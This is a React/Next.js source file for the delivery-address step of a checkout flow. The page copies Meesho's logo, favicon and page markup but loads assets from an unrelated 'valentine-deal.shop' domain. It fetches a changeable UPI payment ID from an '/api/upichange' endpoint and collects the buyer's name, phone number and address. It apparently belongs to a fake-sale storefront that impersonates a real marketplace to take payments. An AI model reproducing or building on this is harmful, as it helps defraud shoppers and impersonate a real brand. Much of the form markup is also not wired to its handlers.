"use client";
import Layout from "@/componets/Layout";
import { useFormik } from "formik";
import Link from "next/link";
import { useRouter } from "next/router";
import { useEffect, useState } from "react";
const Address = () => {
    const router = useRouter();
    const [products1, setProducts1] = useState({ pixelId: "" });
    // if (!("name" in item)) {
    // }
    useEffect(() => {
        fetchProducts1();
    }, []);

    const fetchProducts1 = async () => {
        try {
            let headersList = {
                "Accept": "*/*",
                "User-Agent": "Thunder Client (https://www.thunderclient.com)",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${localStorage.getItem("token")}`
            };

            const response = await fetch('/api/upichange', {
                method: 'GET',
                headers: headersList,
            });

            if (response.ok) {
                const data = await response.json();
                localStorage.setItem("upi", data.upi.upi)
                setProducts1(data.pixelId);
            } else {
            }
        } catch (error) {
        }
    };
    const { values, handleChange, handleSubmit } = useFormik({
        initialValues: {
            fname: "",
            mobile: "",
            pincode: "",
            city: "",
            state: "",
            house: "",
            colonny: "",
        },
        onSubmit: () => {
            localStorage.setItem("user", JSON.stringify({
                address: values.house,
                name: values.fname,
                phone: Number(values.mobile),
            }))
            router.push("/ordersummdary");
        },
    });
    return (
        <Layout data={products1}>
            <div>
                <>
                    <title>Sale Sale Sale - Home</title>
                    <meta httpEquiv="Pragma" content="no-cache" />
                    <meta httpEquiv="Expires" content={-1} />
                    <meta httpEquiv="Content-Type" content="text/html; charset=UTF-8" />
                    <meta name="Keywords" content="Maha Sale" />
                    <meta name="Description" content="Maha Sale" />
                    <meta property="og:title" content="Maha Sale" />
                    <meta name="theme-color" content="#9f2089" id="themeColor" />
                    <meta
                        name="viewport"
                        content="width=device-width,minimum-scale=1,user-scalable=no"
                    />
                    <link rel="shortcut icon" href="https://www.meesho.com/favicon.ico" />
                    <link
                        rel="stylesheet"
                        href="/assets/website/css/bootstrap.min.css"
                    />
                    <link
                        rel="stylesheet"
                        href="/assets/website/css/custom.css"
                    />
                    <link
                        rel="stylesheet"
                        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
                        integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA=="
                        crossOrigin="anonymous"
                        referrerPolicy="no-referrer"
                    />
                    <link rel="preconnect" href="https://fonts.googleapis.com" />
                    <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="" />
                    <link
                        href="https://fonts.googleapis.com/css2?family=Poppins&display=swap"
                        rel="stylesheet"
                    />
                    <style
                        dangerouslySetInnerHTML={{
                            __html:
                                "\n        body,\n        a,\n        p,\n        span,\n        div,\n        input,\n        button,\n        h1,\n        h2,\n        h3,\n        h4,\n        h5,\n        h6,\n        button,\n        input,\n        optgroup,\n        select,\n        textarea {\n            font-family: 'Poppins', sans-serif !important;\n        }\n    "
                        }}
                    />
                    {/* Meta Pixel Code */}
                    <noscript>
                        &lt;img height="1" width="1" style="display:none"
                        src="https://www.facebook.com/tr?id=239159289163632&amp;ev=PageView&amp;noscript=1"
                        /&gt;
                    </noscript>
                    {/* End Meta Pixel Code */}
                    <link
                        rel="stylesheet"
                        href="chrome-extension://mhnlakgilnojmhinhkckjpncpbhabphi/content.css"
                    />
                    <link
                        rel="stylesheet"
                        href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700&display=swap"
                    />
                    <style
                        id="_goober"
                        dangerouslySetInnerHTML={{
                            __html:
                                " .go1475592160{height:0;}.go1671063245{height:auto;}.go1888806478{display:flex;flex-wrap:wrap;flex-grow:1;}@media (min-width:600px){.go1888806478{flex-grow:initial;min-width:288px;}}.go167266335{background-color:#313131;font-size:0.875rem;line-height:1.43;letter-spacing:0.01071em;color:#fff;align-items:center;padding:6px 16px;border-radius:4px;box-shadow:0px 3px 5px -1px rgba(0,0,0,0.2),0px 6px 10px 0px rgba(0,0,0,0.14),0px 1px 18px 0px rgba(0,0,0,0.12);}.go3162094071{padding-left:20px;}.go3844575157{background-color:#313131;}.go1725278324{background-color:#43a047;}.go3651055292{background-color:#d32f2f;}.go4215275574{background-color:#ff9800;}.go1930647212{background-color:#2196f3;}.go946087465{display:flex;align-items:center;padding:8px 0;}.go703367398{display:flex;align-items:center;margin-left:auto;padding-left:16px;margin-right:-8px;}.go3963613292{width:100%;position:relative;transform:translateX(0);top:0;right:0;bottom:0;left:0;min-width:288px;}.go1141946668{box-sizing:border-box;display:flex;max-height:100%;position:fixed;z-index:1400;height:auto;width:auto;transition:top 300ms ease 0ms,right 300ms ease 0ms,bottom 300ms ease 0ms,left 300ms ease 0ms,max-width 300ms ease 0ms;pointer-events:none;max-width:calc(100% - 40px);}.go1141946668 .notistack-CollapseWrapper{padding:6px 0px;transition:padding 300ms ease 0ms;}@media (max-width:599.95px){.go1141946668{width:100%;max-width:calc(100% - 32px);}}.go3868796639 .notistack-CollapseWrapper{padding:2px 0px;}.go3118922589{top:14px;flex-direction:column;}.go1453831412{bottom:14px;flex-direction:column-reverse;}.go4027089540{left:20px;}@media (min-width:600px){.go4027089540{align-items:flex-start;}}@media (max-width:599.95px){.go4027089540{left:16px;}}.go2989568495{right:20px;}@media (min-width:600px){.go2989568495{align-items:flex-end;}}@media (max-width:599.95px){.go2989568495{right:16px;}}.go4034260886{left:50%;transform:translateX(-50%);}@media (min-width:600px){.go4034260886{align-items:center;}}"
                        }}
                    />
                    <div id="container" style={{ overflow: "hidden" }}>
                        <div style={{ height: "100%" }} data-reactroot="">
                            <div>
                                <div className="_2dxSCm">
                                    <div className="_3CzzrP" style={{}}>
                                        <div className="_38U37R">
                                            <div>
                                                <div className="_1FWdmb" style={{}}>
                                                    <div className="d-flex align-items-center">
                                                        <Link
                              href="/"
                                                            className="_3NH1qf "
                                                            id="back-btn"
                                                            style={{ marginTop: 5 }}
                                                        >
                                                            <svg
                                                                width={25}
                                                                height={25}
                                                                viewBox="0 0 20 20"
                                                                fill="none"
                                                                xmlns="http://www.w3.org/2000/svg"
                                                                mt={2}
                                                                iconsize={24}
                                                                className="sc-gswNZR ffVWIj"
                                                            >
                                                                <path
                                                                    d="M13.7461 2.31408C13.5687 2.113 13.3277 2 13.0765 2C12.8252 2 12.5843 2.113 12.4068 2.31408L6.27783 9.24294C5.90739 9.66174 5.90739 10.3382 6.27783 10.757L12.4068 17.6859C12.7773 18.1047 13.3757 18.1047 13.7461 17.6859C14.1166 17.2671 14.0511 16.5166 13.7461 16.1718L8.29154 9.99462L13.7461 3.82817C13.9684 3.57691 14.1071 2.72213 13.7461 2.31408Z"
                                                                    fill="#666666"
                                                                />
                                                            </svg>
                                                        </Link>
                                                        <a className="_3NH1qf d-none" id="showmenu">
                                                            <svg
                                                                width="100%"
                                                                height="100%"
                                                                fill="none"
                                                                xmlns="http://www.w3.org/2000/svg"
                                                                mt={5}
                                                                iconsize={24}
                                                                className="sc-gswNZR jQgwzc"
                                                            >
                                                                <path
                                                                    d="M2 17.2222C2 17.8359 2.49746 18.3333 3.11111 18.3333H20.8889C21.5025 18.3333 22 17.8359 22 17.2222C22 16.6086 21.5025 16.1111 20.8889 16.1111H3.11111C2.49746 16.1111 2 16.6086 2 17.2222ZM2 11.6667C2 12.2803 2.49746 12.7778 3.11111 12.7778H20.8889C21.5025 12.7778 22 12.2803 22 11.6667C22 11.053 21.5025 10.5556 20.8889 10.5556H3.11111C2.49746 10.5556 2 11.053 2 11.6667ZM3.11111 5C2.49746 5 2 5.49746 2 6.11111C2 6.72476 2.49746 7.22222 3.11111 7.22222H20.8889C21.5025 7.22222 22 6.72476 22 6.11111C22 5.49746 21.5025 5 20.8889 5H3.11111Z"
                                                                    fill="#333333"
                                                                />
                                                            </svg>
                                                        </a>
                                                        <h4 className="header-title">Add delivery address</h4>
                                                    </div>
                                                    <div className="header-menu">
                                                        <a className="_3NH1qf" href="#">
                                                            <svg
                                                                width={24}
                                                                height={25}
                                                                fill="none"
                                                                xmlns="http://www.w3.org/2000/svg"
                                                                ml={16}
                                                                iconsize={24}
                                                                className="sc-gswNZR dJzkYm"
                                                            >
                                                                <path fill="#fff" d="M0 .657h24v24H0z" />
                                                                <path fill="#fff" d="M2 2.657h20v20H2z" />
                                                                <path
                                                                    d="M22 9.174c0 3.724-1.87 7.227-9.67 12.38a.58.58 0 0 1-.66 0C3.87 16.401 2 12.898 2 9.174S4.59 3.67 7.26 3.66c3.22-.081 4.61 3.573 4.74 3.774.13-.201 1.52-3.855 4.74-3.774C19.41 3.669 22 5.45 22 9.174Z"
                                                                    fill="#ED3843"
                                                                />
                                                            </svg>
                                                        </a>
                                                        <a className="_3NH1qf" href="#" onclick="openNav()">
                                                            <svg
                                                                width={24}
                                                                height={25}
                                                                fill="none"
                                                                xmlns="http://www.w3.org/2000/svg"
                                                                ml={16}
                                                                iconsize={24}
                                                                className="sc-gswNZR dJzkYm"
                                                            >
                                                                <g clipPath="url(#cart-header_svg__a)">
                                                                    <path fill="#fff" d="M2.001 1.368h20v20h-20z" />
                                                                    <g clipPath="url(#cart-header_svg__b)">
                                                                        <g clipPath="url(#cart-header_svg__c)">
                                                                            <path
                                                                                d="M6.003 5.183h15.139c.508 0 .908.49.85 1.046l-.762 7.334c-.069.62-.537 1.1-1.103 1.121l-12.074.492-2.05-9.993Z"
                                                                                fill="#C53EAD"
                                                                            />
                                                                            <path
                                                                                d="M11.8 21.367c.675 0 1.22-.597 1.22-1.334 0-.737-.545-1.335-1.22-1.335-.673 0-1.22.598-1.22 1.335s.547 1.334 1.22 1.334ZM16.788 21.367c.674 0 1.22-.597 1.22-1.334 0-.737-.546-1.335-1.22-1.335-.673 0-1.22.598-1.22 1.335s.547 1.334 1.22 1.334Z"
                                                                                fill="#9F2089"
                                                                            />
                                                                            <path
                                                                                d="m2.733 4.169 3.026 1.42 2.528 12.085c.127.609.615 1.036 1.181 1.036h9.615"
                                                                                stroke="#9F2089"
                                                                                strokeWidth="1.5"
                                                                                strokeLinecap="round"
                                                                                strokeLinejoin="round"
                                                                            />
                                                                        </g>
                                                                    </g>
                                                                </g>
                                                                <defs>
                                                                    <clipPath id="cart-header_svg__a">
                                                                        <path
                                                                            fill="#fff"
                                                                            transform="translate(2.001 1.368)"
                                                                            d="M0 0h20v20H0z"
                                                                        />
                                                                    </clipPath>
                                                                    <clipPath id="cart-header_svg__b">
                                                                        <path
                                                                            fill="#fff"
                                                                            transform="translate(2.001 1.368)"
                                                                            d="M0 0h20v20H0z"
                                                                        />
                                                                    </clipPath>
                                                                    <clipPath id="cart-header_svg__c">
                                                                        <path
                                                                            fill="#fff"
                                                                            transform="translate(2.001 3.368)"
                                                                            d="M0 0h20v18H0z"
                                                                        />
                                                                    </clipPath>
                                                                </defs>
                                                            </svg>
                                                            <span className="header__cart-count header__cart-count--floating bubble-count">
                                                         {typeof localStorage !== 'undefined' && localStorage.getItem("d1") && JSON.parse(localStorage.getItem("d1")).length}


                                                            </span>
                                                        </a>
                                                    </div>
                                                </div>
                                                <div className="search-bar d-none">
                                                    <div className="_3QNhdh" id="guidSearch">
                                                        <div className="ORogdv">
                                                            <div className="_1k9EoO">
                                                                <div className="_2d36Hu">
                                                                    <a href="javascript:void(0)" className="search-div">
                                                                        <div
                                                                            placeholder="Search for Sarees, Kurtis, Cosmetics, etc."
                                                                            className="sc-eeMvmM fscVpr"
                                                                        >
                                                                            <div className="sc-cUEOzv ilUiic">
                                                                                <svg
                                                                                    width={20}
                                                                                    height={21}
                                                                                    viewBox="0 0 20 21"
                                                                                    fill="none"
                                                                                    xmlns="http://www.w3.org/2000/svg"
                                                                                >
                                                                                    <rect
                                                                                        width={20}
                                                                                        height={20}
                                                                                        transform="translate(0 0.560547)"
                                                                                        fill="white"
                                                                                    />
                                                                                    <g clipPath="url(#clip0_2444_6193)">
                                                                                        <path
                                                                                            d="M13.4564 12.0018L11.4426 14.0156L16.3498 18.9228C16.7013 19.2743 17.2711 19.2743 17.6226 18.9228L18.3636 18.1818C18.7151 17.8303 18.7151 17.2604 18.3636 16.909L13.4564 12.0018Z"
                                                                                            fill="#ADADC4"
                                                                                        />
                                                                                        <path
                                                                                            d="M14.7135 8.69842C14.7135 12.3299 11.7696 15.2738 8.13812 15.2738C4.50664 15.2738 1.56274 12.3299 1.56274 8.69842C1.56274 5.06694 4.50664 2.12305 8.13812 2.12305C11.7696 2.12305 14.7135 5.06694 14.7135 8.69842Z"
                                                                                            fill="#EAEAF2"
                                                                                            stroke="#ADADC4"
                                                                                            strokeWidth="1.125"
                                                                                        />
                                                                                    </g>
                                                                                    <defs>
                                                                                        <clipPath id="clip0_2444_6193">
                                                                                            <rect
                                                                                                width={18}
                                                                                                height={18}
                                                                                                fill="white"
                                                                                                transform="translate(1 1.56055)"
                                                                                            />
                                                                                        </clipPath>
                                                                                    </defs>
                                                                                </svg>
                                                                            </div>
                                                                            <input
                                                                                fontSize="13px"
                                                                                fontWeight="book"
                                                                                type="text"
                                                                                placeholder="Search for Sarees, Kurtis, Cosmetics, etc."
                                                                                readOnly=""
                                                                                className="sc-dkrFOg bWTBPR sc-bCfvAP dsLogY search-input-elm sc-bCfvAP dsLogY search-input-elm"
                                                                                color="greyBase"
                                                                                defaultValue=""
                                                                            />
                                                                        </div>
                                                                    </a>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="sc-bBXxYQ jMfCEJ" />
                                        <div id="container">
                                            <div style={{ height: "100%" }} data-reactroot="">
                                                <div className="_1fhgRH">
                                                    <div className="card py-1 max-height">
                                                        <div
                                                            data-testid="stepper-container"
                                                            className="sc-geuGuN gqSLnX"
                                                        >
                                                            <div className="sc-kGhOqx chtKwW">
                                                                <ul className="sc-bAKPPm eOmvaT">
                                                                    <div className="sc-jZiqTT hGoFZP">
                                                                        <div className="sc-bxSTMQ geeMAN">
                                                                            <div
                                                                                data-testid="left-line"
                                                                                className="sc-PJClH lagJzQ"
                                                                            />
                                                                            <div className="sc-iJkHyd IhlWp">
                                                                                <svg
                                                                                    width={20}
                                                                                    height={20}
                                                                                    viewBox="0.5 0 20 20"
                                                                                    fill="none"
                                                                                    xmlns="http://www.w3.org/2000/svg"
                                                                                >
                                                                                    <title>check-icon</title>
                                                                                    <rect
                                                                                        x="1.25"
                                                                                        y="0.75"
                                                                                        width="18.5"
                                                                                        height="18.5"
                                                                                        rx="9.25"
                                                                                        fill="#5585F8"
                                                                                    />
                                                                                    <path
                                                                                        fillRule="evenodd"
                                                                                        clipRule="evenodd"
                                                                                        d="M16.6716 7.37285C17.0971 6.96439 17.1108 6.28832 16.7023 5.86289C16.2939 5.43755 15.618 5.4238 15.1926 5.83218L10.9997 9.85723L10.9997 9.85727L9.02229 11.7557L6.82333 9.55674C6.40622 9.13963 5.72995 9.13963 5.31284 9.55674C4.8957 9.97388 4.89573 10.6502 5.31289 11.0673L8.26525 14.0192C8.66883 14.4227 9.32103 14.4293 9.73274 14.0341L10.9998 12.8178V12.8178L16.6716 7.37285Z"
                                                                                        fill="white"
                                                                                    />
                                                                                    <rect
                                                                                        x="1.25"
                                                                                        y="0.75"
                                                                                        width="18.5"
                                                                                        height="18.5"
                                                                                        rx="9.25"
                                                                                        stroke="#5585F8"
                                                                                        strokeWidth="1.5"
                                                                                    />
                                                                                </svg>
                                                                            </div>
                                                                            <div
                                                                                data-testid="right-line"
                                                                                className="sc-jfdOKL bSausD"
                                                                            />
                                                                        </div>
                                                                        <div className="sc-jWquRx ezBHwi">Cart</div>
                                                                    </div>
                                                                    <div className="sc-jZiqTT hGoFZP">
                                                                        <div className="sc-bxSTMQ geeMAN">
                                                                            <div
                                                                                data-testid="left-line"
                                                                                className="sc-PJClH kHHhBS"
                                                                            />
                                                                            <div className="sc-dGHKFW cRaGaC">2</div>
                                                                            <div
                                                                                data-testid="right-line"
                                                                                className="sc-jfdOKL bSausD"
                                                                            />
                                                                        </div>
                                                                        <div className="sc-jWquRx iefUco">Address</div>
                                                                    </div>
                                                                    <div className="sc-jZiqTT hGoFZP">
                                                                        <div className="sc-bxSTMQ geeMAN">
                                                                            <div
                                                                                data-testid="left-line"
                                                                                className="sc-PJClH kHHhBS"
                                                                            />
                                                                            <div className="sc-dGHKFW iefbLi">3</div>
                                                                            <div
                                                                                data-testid="right-line"
                                                                                className="sc-jfdOKL bSausD"
                                                                            />
                                                                        </div>
                                                                        <div className="sc-jWquRx ezBHwi">Payment</div>
                                                                    </div>
                                                                    <div className="sc-jZiqTT hGoFZP">
                                                                        <div className="sc-bxSTMQ geeMAN">
                                                                            <div
                                                                                data-testid="left-line"
                                                                                className="sc-PJClH kHHhBS"
                                                                            />
                                                                            <div className="sc-dGHKFW iefbLi">4</div>
                                                                            <div
                                                                                data-testid="right-line"
                                                                                className="sc-jfdOKL jSyZxf"
                                                                            />
                                                                        </div>
                                                                        <div className="sc-jWquRx ezBHwi">Summary</div>
                                                                    </div>
                                                                </ul>
                                                            </div>
                                                        </div>
                                                        <div className="sc-bBXxYQ jMfCEJ" />
                                                        <div className="sc-fjqEFS bbBFRm">
                                                            <div className="sc-bfKFlL beUHuI">
                                                                <div className="sc-bcSJjp izYblt">
                                                                    <div className="sc-eBxihg lcYQRo">
                                                                        <span className="sc-eEpejC iZWODx">
                                                                            <svg
                                                                                width={20}
                                                                                height={20}
                                                                                viewBox="0 0 20 20"
                                                                                fill="none"
                                                                                xmlns="http://www.w3.org/2000/svg"
                                                                            >
                                                                                <rect width={20} height={20} fill="white" />
                                                                                <path
                                                                                    d="M15.2565 17.8276C15.2565 19.0296 12.9683 19.9999 10.1588 19.9999C7.34922 19.9999 5.06104 19.0296 5.06104 17.8276C5.07552 17.6683 5.14793 17.4945 5.22034 17.3642C5.72722 16.3794 7.75472 15.6553 10.1877 15.6553C12.6207 15.6553 14.6483 16.3794 15.1406 17.3642C15.2131 17.4945 15.2565 17.6683 15.2565 17.8276Z"
                                                                                    fill="#3A66CF"
                                                                                />
                                                                                <path
                                                                                    d="M17.0527 6.4301C16.5313 -0.0434386 10.1157 7.62167e-06 10.1157 7.62167e-06C10.1157 7.62167e-06 3.6711 -0.0434386 3.14974 6.4301C2.70079 12.1651 8.49367 16.9152 9.82603 17.929C9.89844 17.9869 9.99982 18.0159 10.1012 18.0159C10.2026 18.0159 10.2895 17.9869 10.3764 17.929C11.7087 16.9152 17.5161 12.1651 17.0527 6.4301ZM10.1157 9.71756C9.57984 9.71756 9.05848 9.55826 8.62401 9.26861C8.17506 8.97897 7.82749 8.55899 7.62474 8.06659C7.42199 7.5742 7.36406 7.03835 7.46544 6.517C7.56681 5.99564 7.82749 5.51772 8.20403 5.14119C8.58056 4.76465 9.05848 4.50397 9.57984 4.4026C10.1012 4.30122 10.637 4.34467 11.1294 4.54742C11.6218 4.75017 12.0418 5.09774 12.3459 5.53221C12.6356 5.98116 12.7949 6.50251 12.7949 7.02387C12.7949 7.7335 12.5197 8.41416 12.0128 8.92104C11.506 9.42792 10.8253 9.71756 10.1157 9.71756Z"
                                                                                    fill="#90B1FB"
                                                                                />
                                                                            </svg>
                                                                        </span>
                                                                        <span className="sc-hFvvYD gANwSd">Address</span>
                                                                    </div>


                                                                    <div className="form-floating mb-3 mt-5">
                                                                        <input
                                                                            className="form-control"
                                                                            type="text"
                                                                            id="name"
                                                                            name="name"
                                                                            placeholder="Full name"
                                                                        />
                                                                        <label htmlFor="floatingInput">Full Name</label>
                                                                    </div>
                                                                    <div className="form-floating mb-3">
                                                                        <input
                                                                            className="form-control"
                                                                            type="text"
                                                                            id="number"
                                                                            name="number"
                                                                            placeholder="Mobile number"
                                                                        />
                                                                        <label htmlFor="floatingInput">
                                                                            Mobile number
                                                                        </label>
                                                                    </div>
                                                                    <div className="form-floating mb-3">
                                                                        <input
                                                                            className="form-control"
                                                                            type="text"
                                                                            id="pin"
                                                                            name="pin"
                                                                            placeholder="PIN code"
                                                                        />
                                                                        <label htmlFor="floatingInput">Pincode</label>
                                                                    </div>
                                                                    <div className="row mb-3">
                                                                        <div className="col-6 form-floating">
                                                                            <input
                                                                                className="form-control"
                                                                                type="text"
                                                                                id="city"
                                                                                name="city"
                                                                                placeholder="Town/City"
                                                                            />
                                                                            <label htmlFor="floatingInput">City</label>
                                                                        </div>
                                                                        <div className="col-6 form-floating">
                                                                            <select
                                                                                className="form-select"
                                                                                id="state"
                                                                                name="state"
                                                                            >
                                                                                <option value="AP">Andhra Pradesh</option>
                                                                                <option value="AR">Arunachal Pradesh</option>
                                                                                <option value="AS">Assam</option>
                                                                                <option value="BR">Bihar</option>
                                                                                <option value="CT">Chhattisgarh</option>
                                                                                <option value="GA">Goa</option>
                                                                                <option value="GJ">Gujarat</option>
                                                                                <option value="HR">Haryana</option>
                                                                                <option value="HP">Himachal Pradesh</option>
                                                                                <option value="JK">
                                                                                    Jammu &amp; Kashmir
                                                                                </option>
                                                                                <option value="JH">Jharkhand</option>
                                                                                <option value="KA">Karnataka</option>
                                                                                <option value="KL">Kerala</option>
                                                                                <option value="MP">Madhya Pradesh</option>
                                                                                <option value="MH">Maharashtra</option>
                                                                                <option value="MN">Manipur</option>
                                                                                <option value="ML">Meghalaya</option>
                                                                                <option value="MZ">Mizoram</option>
                                                                                <option value="NL">Nagaland</option>
                                                                                <option value="OR">Odisha</option>
                                                                                <option value="PB">Punjab</option>
                                                                                <option value="RJ">Rajasthan</option>
                                                                                <option value="SK">Sikkim</option>
                                                                                <option value="TN">Tamil Nadu</option>
                                                                                <option value="TS">Telangana</option>
                                                                                <option value="TR">Tripura</option>
                                                                                <option value="UK">Uttarakhand</option>
                                                                                <option value="UP">Uttar Pradesh</option>
                                                                                <option value="WB">West Bengal</option>
                                                                                <option value="AN">
                                                                                    Andaman &amp; Nicobar
                                                                                </option>
                                                                                <option value="CH">Chandigarh</option>
                                                                                <option value="DN">
                                                                                    Dadra and Nagar Haveli
                                                                                </option>
                                                                                <option value="DD">Daman &amp; Diu</option>
                                                                                <option value="DL">Delhi</option>
                                                                                <option value="LD">Lakshadweep</option>
                                                                                <option value="PY">Puducherry</option>
                                                                            </select>
                                                                            <label htmlFor="floatingInput">State</label>
                                                                        </div>
                                                                    </div>
                                                                    <div className="form-floating mb-3">
                                                                        <input
                                                                            className="form-control"
                                                                            type="text"
                                                                            id="flat"
                                                                            name="flat"
                                                                            placeholder="Flat, House.no, Building, Company"
                                                                        />
                                                                        <label htmlFor="floatingInput">
                                                                            House No., Building Name
                                                                        </label>
                                                                    </div>
                                                                    <div className="form-floating mb-3">
                                                                        <input
                                                                            className="form-control"
                                                                            type="text"
                                                                            id="area"
                                                                            name="area"
                                                                            placeholder="Area, Colony, Street, Sector, Village"
                                                                        />
                                                                        <label htmlFor="floatingInput">
                                                                            Road name, Area, Colony
                                                                        </label>
                                                                    </div>
                                                                    <div className="card-footer px-0" onClick={() => {
                                                                        router.push("/payment");
                                                                    }}>
                                                                        <button
                                                                            className="btn btn-dark save-address"

                                                                        >
                                                                            Save Address and Continue
                                                                        </button>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <img
                                                            src="https://kurti.valentine-deal.shop/assets/website/images/secure.jpg"
                                                            alt=""
                                                        />
                                                    </div>
                                                </div>
                                            </div>
                                            <style
                                                dangerouslySetInnerHTML={{
                                                    __html:
                                                        '\n        .header-menu {\n            display: none;\n        }\n\n        .save-address {\n            display: flex;\n            align-items: center;\n            justify-content: center;\n            cursor: pointer;\n            font-style: normal;\n            text-align: center;\n            letter-spacing: 0.0015em;\n            font-size: 15px;\n            line-height: 20px;\n            border-radius: 4px;\n            color: rgb(255, 255, 255);\n            background: rgb(159, 32, 137);\n            border: none;\n            padding: 12px;\n            font-weight: 500;\n            width: 100%;\n            white-space: nowrap;\n            overflow: hidden;\n            text-overflow: ellipsis;\n            height: 50px;\n        }\n\n        .bbBFRm {\n            overflow: auto;\n            background-color: rgb(234, 234, 242);\n            width: 100%;\n            position: fixed;\n            bottom: 69px;\n            top: 112px;\n            max-width: 800px;\n        }\n\n        .izYblt {\n            margin-bottom: 8px;\n            background-color: rgb(255, 255, 255);\n            padding: 20px 16px;\n        }\n\n        .lcYQRo {\n            display: flex;\n            -webkit-box-pack: start;\n            justify-content: flex-start;\n            -webkit-box-align: center;\n            align-items: center;\n            gap: 8px;\n        }\n\n        .iZWODx {\n            display: flex;\n        }\n\n        .gANwSd {\n            color: rgb(53, 53, 67);\n            font-weight: 700;\n            font-size: 17px;\n            font-family: "Mier bold";\n            -webkit-box-flex: 1;\n            flex-grow: 1;\n        }\n\n        .jDOiRD {\n            margin-top: 22px;\n            position: relative;\n        }\n\n        .dfztus {\n            display: flex;\n            gap: 20px;\n        }\n\n        .dfztus>div {\n            width: 50%;\n        }\n\n        .bgBfNM {\n            background-color: rgb(255, 255, 255);\n            position: relative;\n        }\n\n        .bgBfNM .input-field-container {\n            padding-bottom: 7px;\n            padding-top: 22px;\n            border-bottom: 1px solid rgb(206, 206, 222);\n        }\n\n        .bgBfNM .input-field {\n            width: 100%;\n            caret-color: rgb(159, 32, 137);\n            outline: none;\n            border: none;\n            text-overflow: ellipsis;\n            background: transparent;\n            font-size: 13px;\n            line-height: 17px;\n            color: rgb(53, 53, 67);\n            font-family: "Mier demi";\n            resize: none;\n            max-height: 17px;\n        }\n\n        .bgBfNM label {\n            position: absolute;\n            left: 0px;\n            top: 24px;\n            font-size: 13px;\n            transition: top 0.2s ease 0s;\n            pointer-events: none;\n            color: rgb(139, 139, 163);\n            font-weight: 500;\n            white-space: nowrap;\n            overflow: hidden;\n            width: 100%;\n            text-overflow: ellipsis;\n        }\n\n        .card-footer {\n            position: fixed;\n            width: 95%;\n            max-width: 800px;\n            background-color: rgb(255, 255, 255);\n            bottom: 0px;\n            z-index: 1;\n            right: 50%;\n            transform: translate(50%, 0px);\n        }\n    '
                                                }}
                                            />{" "}
                                        </div>
                                    </div>{" "}
                                </div>
                            </div>
                        </div>
                    </div>
                    <div id="mySidenav" className="sidenav" style={{ right: "-100%" }}>
                        <div className="sidenav-div">
                            <div className="drawer__title">
                            <div className='px-1'>
                                <svg viewBox="0 0 156 36" fill="none" xmlns="http://www.w3.org/2000/svg" height="25" width="90" iconsize="20" class="sc-gswNZR gNMKRJ"><g clip-path="url(#meeshoLogo_svg__a)"><path fill="#fff" d="M0 0h156v36H0z"></path><path d="M56.307 23.698c.38-.29.568-.707.568-1.253 0-1.731-.237-3.288-.707-4.675-.47-1.383-1.154-2.56-2.053-3.535a8.967 8.967 0 0 0-3.235-2.232c-1.262-.515-2.685-.774-4.264-.774-2.157 0-4.08.492-5.767 1.48-1.687.99-3.007 2.35-3.969 4.08-.957 1.732-1.436 3.755-1.436 6.063 0 2.372.492 4.42 1.481 6.157.989 1.731 2.394 3.069 4.22 4.013 1.825.944 3.995 1.414 6.518 1.414 1.186 0 2.47-.161 3.852-.479 1.383-.318 2.604-.814 3.669-1.48.546-.336.935-.73 1.163-1.186.228-.457.313-.904.25-1.347a2.007 2.007 0 0 0-.523-1.119c-.29-.304-.675-.478-1.163-.523-.488-.045-1.047.112-1.687.479a9.65 9.65 0 0 1-2.805 1.024c-.989.197-1.88.295-2.667.295-2.281 0-4.004-.613-5.176-1.847-.926-.976-1.481-2.358-1.673-4.125h13.78c.707 0 1.244-.144 1.624-.43Zm-12.72-7.705c.895-.595 1.982-.89 3.262-.89 1.154 0 2.12.25 2.894.752.774.5 1.37 1.226 1.777 2.165.34.783.532 1.732.59 2.828H40.93c.107-.864.304-1.655.603-2.349.475-1.078 1.16-1.915 2.054-2.505ZM81.13 23.698c.38-.29.568-.707.568-1.253 0-1.731-.237-3.288-.707-4.675-.47-1.383-1.154-2.56-2.054-3.535a8.966 8.966 0 0 0-3.234-2.232c-1.262-.515-2.685-.774-4.264-.774-2.157 0-4.08.492-5.767 1.48-1.687.99-3.007 2.35-3.969 4.08-.957 1.732-1.436 3.755-1.436 6.063 0 2.372.492 4.42 1.48 6.157.99 1.731 2.394 3.069 4.22 4.013 1.825.944 3.995 1.414 6.519 1.414 1.185 0 2.47-.161 3.852-.479 1.383-.318 2.604-.814 3.669-1.48.546-.336.935-.73 1.163-1.186.228-.457.313-.904.25-1.347a2.008 2.008 0 0 0-.523-1.119c-.29-.304-.675-.478-1.163-.523-.488-.045-1.047.112-1.687.479a9.65 9.65 0 0 1-2.805 1.024c-.989.197-1.88.295-2.667.295-2.282 0-4.004-.613-5.176-1.847-.931-.976-1.481-2.358-1.674-4.125h13.78c.703 0 1.245-.144 1.625-.43Zm-12.72-7.705c.895-.595 1.982-.89 3.261-.89 1.155 0 2.121.25 2.895.752.774.5 1.37 1.226 1.776 2.165.34.783.533 1.732.591 2.828h-11.18c.106-.864.303-1.655.603-2.349.47-1.078 1.154-1.915 2.054-2.505ZM97.993 21.394l-4.559-.868c-.881-.152-1.535-.438-1.96-.868-.425-.425-.64-.957-.64-1.597 0-.85.358-1.535 1.07-2.054.716-.514 1.816-.774 3.306-.774.792 0 1.62.108 2.483.318.868.215 1.772.564 2.712 1.047.514.241.98.326 1.391.25a1.71 1.71 0 0 0 1.025-.595 2.47 2.47 0 0 0 .546-1.096 1.975 1.975 0 0 0-.112-1.208c-.166-.394-.479-.716-.935-.957a13.835 13.835 0 0 0-3.396-1.347c-1.173-.29-2.425-.434-3.763-.434-1.852 0-3.494.29-4.926.868-1.427.577-2.546 1.4-3.351 2.46-.805 1.066-1.208 2.327-1.208 3.786 0 1.61.492 2.926 1.48 3.942.99 1.02 2.426 1.709 4.31 2.076l4.559.867c.94.184 1.646.466 2.12.842.47.38.707.921.707 1.62 0 .818-.358 1.48-1.07 1.981-.715.501-1.798.752-3.26.752-1.034 